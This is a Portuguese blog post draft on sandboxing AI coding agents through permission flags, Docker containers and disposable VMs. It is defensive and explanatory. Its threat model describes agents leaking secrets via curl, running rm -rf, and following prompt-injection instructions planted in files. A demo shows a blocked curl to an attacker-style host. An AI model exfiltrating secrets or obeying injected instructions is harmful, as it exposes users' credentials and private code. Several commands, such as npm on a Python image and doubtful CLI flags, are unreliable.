---
date: 2026-07-13T18:05:20.000Z
draft: true
title: 'Como Executar com Segurança Agentes de Codificação de IA: Um Guia Prático de Sandboxing [2026]'
description: Guia passo a passo para isolar agentes de codificação de IA como Claude Code, Codex e Cursor. Evite vazamentos de dados, restrinja o acesso à rede e execute agentes com segurança usando Docker, VMs e escopo de permissões.
categories:
  - article
tags:
  - ai
  - security
  - dev
  - homelab
  - linux
slug: executar-seguranca-agentes-ia-sandboxing
translation_source_hash: ff84aec99946df6978ac946a49b18a63aac8142ab1cc2374c6d993cf434c4280
---
Um agente de codificação de IA com acesso ao sistema de arquivos é uma vulnerabilidade à espera de acontecer. Na semana passada, foi o Grok CLI enviando todo um diretório home para o Google Cloud Storage. Na próxima semana, podem ser suas chaves de API, suas chaves SSH ou as credenciais do banco de dados do seu cliente acabando onde não deveriam.

O problema é estrutural: agentes de codificação de IA precisam de amplo acesso ao sistema para serem úteis. Eles instalam pacotes, editam arquivos, executam testes e se conectam a servidores. Mas o mesmo acesso que os torna produtivos os torna perigosos — especialmente quando injeção de prompt ou uso indevido simples de ferramentas podem transformar um agente em um vetor de exfiltração não intencional.

Este guia aborda as abordagens práticas para isolar (sandboxing) agentes de codificação de IA, desde a definição de escopo de permissões leve até o isolamento completo de VM. Você aprenderá contra o que cada abordagem protege, o que ela perde e como configurá-la.

## O Modelo de Ameaça

Antes de escolher uma estratégia de sandboxing, entenda contra o que você está se protegendo.

**Exfiltração de dados** — O agente lê um arquivo contendo segredos (chaves de API, chaves SSH, arquivos .env) e os escreve em um servidor externo. Isso pode acontecer por meio de chamadas de ferramenta diretas (o agente executa `curl` com o conteúdo do arquivo) ou por canais indiretos (o agente inclui o segredo em um commit enviado para um repositório remoto).

**Corrupção do sistema de arquivos** — O agente executa `rm -rf` no diretório errado, sobrescreve arquivos de configuração ou modifica arquivos que não deveria tocar. Mesmo agentes bem-intencionados podem cometer erros destrutivos — o incidente do Grok CLI não foi malicioso; o agente simplesmente seguiu instruções para "fazer backup" do diretório home sem entender quais arquivos deveriam permanecer locais.

**Injeção na cadeia de suprimentos** — Ao instalar dependências, o agente baixa um pacote malicioso de um registro comprometido. A confiança do agente em registros de pacotes é sua superfície de ataque.

**Escalada de injeção de prompt** — Um atacante incorpora instruções em um arquivo, issue ou comentário que o agente lê. O agente segue os comandos do atacante com os privilégios da sua conta — lendo repositórios privados, enviando código ou expondo credenciais.

## Abordagem 1: Definição de Escopo de Permissões (Mais Leve)

O sandbox mais simples é aquele embutido na configuração do seu agente. A maioria dos agentes de codificação modernos suporta alguma forma de definição de escopo de permissões.

**Claude Code** tem níveis de permissão embutidos:

```bash
# Padrão: perguntar para cada ação potencialmente perigosa
claude

# Pular perguntas, mas ainda avisar (não recomendado para produção)
claude --dangerously-skip-permissions

# Restringir acesso ao sistema de arquivos a um diretório específico
claude --allowed-directories /home/user/project
```

A flag `--allowed-directories` é a mais importante. Ela restringe operações de leitura/escrita de arquivos ao caminho especificado, impedindo que o agente acesse chaves SSH em `~/.ssh`, arquivos de token em `~/.config` ou credenciais em arquivos `.env` fora do diretório do projeto.

**Aider** tem uma flag `--read` que limita o agente a acesso somente leitura em arquivos especificados:

```bash
# Agente pode ler tudo, mas só editar arquivos especificados
aider --read-only README.md --read-only .env.example
```

**Cursor/Windsurf** têm configurações de confiança no nível do projeto. O modelo de confiança de workspace do VSCode se aplica aqui: se você marcar um projeto como "restrito", o agente não pode acessar arquivos fora da pasta do workspace.

**O que a definição de escopo de permissões protege:** Leituras acidentais de arquivos sensíveis fora do projeto. Modificação acidental de configuração do sistema.

**O que ela perde:** Exfiltração maliciosa de dados dentro do escopo permitido. Se seu projeto contém chaves de API (não deveria, mas muitos contêm), um agente comprometido ainda pode lê-las e exfiltrá-las. A injeção de prompt não é impedida — o agente ainda pode ser enganado para escrever segredos em um servidor remoto ou enviá-los para um repositório público.

## Abordagem 2: Isolamento Baseado em Contêiner (Médio)

Contêineres Docker fornecem isolamento mais forte ao restringir a visão do agente sobre o sistema de arquivos e a rede para apenas o que você monta e permite explicitamente.

### Sandbox Docker Básico

```dockerfile
FROM python:3.12-slim

# Instale suas ferramentas
RUN apt-get update && apt-get install -y \
    git curl jq \
    && rm -rf /var/lib/apt/lists/*

# Instale o Claude Code
RUN npm install -g @anthropic-ai/claude-code

WORKDIR /project
COPY . /project

# Execute como usuário não root
RUN useradd -m agent
USER agent
ENTRYPOINT ["claude"]
```

Execute com montagens restritas e somente leitura quando possível:

```bash
docker build -t ai-sandbox .
docker run --rm -it \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  --mount type=bind,source=$(pwd),target=/project \
  --network ai-restricted \
  ai-sandbox
```

### Restrições de Rede

A flag `--network` é crítica. Crie uma rede Docker personalizada com acesso de saída em lista de permissões:

```bash
docker network create --driver bridge ai-restricted

# Permitir registries específicos
# O firewall de rede do Docker não suporta permissão por URL nativamente.
# Em vez disso, use um proxy direto:
docker run -d --name ai-proxy \
  --network ai-restricted \
  -e ALLOWED_DOMAINS="github.com,registry.npmjs.org,pypi.org" \
  your-proxy-image

docker run --rm -it \
  --network ai-restricted \
  --env HTTP_PROXY=http://ai-proxy:8080 \
  --env HTTPS_PROXY=http://ai-proxy:8080 \
  --mount type=bind,source=$(pwd),target=/project \
  ai-sandbox
```

Para uma abordagem mais simples sem proxy, use `--network none` e deixe o agente trabalhar apenas em código local — sem instalação de pacotes, sem git push. Você perde utilidade, mas o isolamento é absoluto.

### Melhores Práticas de Segurança Docker

```bash
# Sistema de arquivos raiz somente leitura impede modificação do sistema
# Sem novos privilégios impede escalonamento de privilégios
# Perfil Seccomp restringe chamadas de sistema
docker run --rm -it \
  --read-only \
  --security-opt=no-new-privileges:true \
  --security-opt=seccomp=default \
  --cap-drop=ALL \
  --mount type=bind,source=$(pwd),target=/project \
  ai-sandbox
```

**O que o isolamento por contêiner protege:** Acesso ao sistema de arquivos fora do diretório do projeto montado. Comprometimento em nível de sistema. Exfiltração de rede (com configuração adequada de proxy/sem rede). A maioria dos ataques à cadeia de suprimentos (limitados ao ciclo de vida do contêiner).

**O que ele perde:** O agente ainda pode exfiltrar qualquer arquivo dentro do projeto montado. Se seu arquivo `.env` está na raiz do projeto, ele está acessível. Vulnerabilidades de escape de contêiner existem (raras, mas reais para cenários de kernel compartilhado). A montagem do socket Docker (`/var/run/docker.sock`) daria ao contêiner acesso root ao host — nunca faça isso para agentes de IA.

## Abordagem 3: Isolamento Completo de VM (Mais Forte)

Para isolamento máximo, execute o agente dentro de uma máquina virtual descartável. É o que o [Clawk](https://github.com/clawkwork/clawk) faz — ele provisiona uma VM Linux leve por projeto, monta seu código dentro e restringe a rede a uma lista de permissões.

```bash
# Instale o Clawk
brew install clawkwork/tap/clawk

# Entre no seu projeto e inicie um agente dentro de uma VM
cd my-project
clawk

# O agente recebe uma VM Linux completa com:
# - Seus arquivos do projeto montados em leitura e escrita
# - Seu agente SSH encaminhado (para git push)
# - Rede restrita apenas à lista de permissões
# - Sem acesso a ~/.ssh, ~/.config ou qualquer coisa fora do projeto

# Bloqueando uma tentativa de exfiltração:
$ curl https://tracker.evil.example
# => curl: (7) Falha ao conectar: Conexão recusada

# Suas chaves nunca entraram na VM:
$ cat ~/.ssh/id_rsa
# => cat: /home/agent/.ssh/id_rsa: Arquivo ou diretório inexistente

# Mas git push ainda funciona (ssh-agent encaminhado):
$ git push
# => Enumerando objetos: 5, concluído.
```

Quando o agente inevitavelmente quebrar algo:

```bash
clawk destroy && clawk     # VM nova, mesmo repositório
clawk --resume              # restaurar conversa da sessão anterior
```

### Alternativa: Configuração Manual com QEMU/Libvirt

Se preferir não usar uma ferramenta dedicada, uma VM manual com virt-manager ou `virsh` funciona:

```bash
# Crie uma VM leve com cloud-init
virt-install \
  --name ai-agent-sandbox \
  --memory 2048 \
  --vcpus 2 \
  --disk size=10 \
  --network default \
  --cloud-init user-data=cloud-init.yaml \
  --os-variant ubuntu24.04

# O script cloud-init instala suas ferramentas e configura
# restrições de rede via iptables/nftables
```

O blog tem um [guia detalhado sobre virtualização KVM/libvirt]({{< relref "posts/kvm-virsh-linux-virtualization-guide-2026/" >}}) se você quiser configurar isso do zero.

**O que o isolamento de VM protege:** Tudo. O agente não pode escapar do limite da VM. Seu sistema de arquivos host, chaves SSH, tokens de API e dados pessoais estão fisicamente isolados. A lista de permissões de rede impede a exfiltração para servidores desconhecidos. Mesmo que o agente seja comprometido por injeção de prompt, o atacante ganha acesso a uma VM descartável sem segredos.

**O que ele perde:** Agente SSH encaminhado — o agente pode enviar para remotos permitidos, o que significa que ele poderia enviar código sensível para um repositório público se instruído. A área de transferência do host da VM (copiar/colar) pode vazar dados se compartilhada. A sobrecarga de desempenho é maior que a do Docker.

## Recomendações Práticas

| Abordagem | Tempo de Configuração | Segurança | Desempenho | Melhor Para |
|-----------|-----------------------|-----------|------------|-------------|
| Definição de escopo de permissões | Minutos | Baixa | Nativo | Tarefas rápidas, bases de código confiáveis |
| Sandbox Docker | 30 minutos | Média | Quase nativo | Desenvolvimento regular, projetos semiconfiáveis |
| Isolamento de VM | 1-2 horas | Alta | Moderada | Projetos sensíveis, código não confiável, trabalho com clientes |

**Para desenvolvimento diário em seus próprios projetos:** Comece com definição de escopo de permissões (`--allowed-directories`). Adicione isolamento Docker ao trabalhar com código que envolve chaves de API ou dependências de terceiros. Use isolamento completo de VM para projetos de clientes onde a confidencialidade é contratual.

**Para revisar código não confiável:** Sempre use isolamento de VM. Se você estiver executando um agente de IA em código de fonte desconhecida (um PR de um novo colaborador, uma base de código que você clonou do GitHub sem revisão), o agente pode ser comprometido por arquivos maliciosos no repositório. O isolamento de VM descartável é a única opção segura.

**Para pipelines CI/CD:** Use contêineres Docker efêmeros ou VMs construídas do zero para cada execução. Nunca monte credenciais de CI diretamente — use segredos com escopo de ambiente e passe-os explicitamente. Ferramentas como `services` do GitHub Actions ou a palavra-chave `services` do GitLab CI fornecem isolamento em nível de contêiner gratuitamente.

## Conclusão

O incidente do Grok CLI era inevitável. Não porque o Grok seja exclusivamente perigoso, mas porque toda ferramenta de codificação de IA com amplo acesso ao sistema de arquivos compartilha a mesma superfície de vulnerabilidade. A única correção é o isolamento — um limite que não pode ser driblado, sobrescrito ou ignorado pelo agente.

O nível certo de isolamento depende do que você está protegendo. Se seu projeto não tem segredos, a definição de escopo de permissões pode ser suficiente. Se ele tem chaves de API, dados de clientes ou credenciais, opte pelo menos pelo isolamento em nível Docker. Se a confidencialidade é contratual ou regulatória (SOC 2, HIPAA, GDPR), o isolamento de VM é a única escolha defensável.

O padrão é claro: agentes de IA são ferramentas, não funcionários. Confie neles com ambientes isolados, não com seu diretório home.

Leia também:

- [KVM e Virsh no Linux: Guia Completo para Máquinas Virtuais [2026]]({{< relref "posts/kvm-virsh-linux-virtualization-guide-2026/" >}})
- [GitLost [2026]: Como a Injeção de Prompt no Agente de IA do GitHub Vaza Repositórios Privados]({{< relref "posts/gitlost-github-agentic-workflows-prompt-injection-2026/" >}})
- [Como Agentes de Codificação de IA Realmente Funcionam: Um Guia Arquitetural [2026]]({{< relref "posts/ai-coding-agents-architectural-guide-2026/" >}})

---

Você pode entrar em contato para conversar sobre este e outros assuntos em <contact@lucasaguiar.xyz>
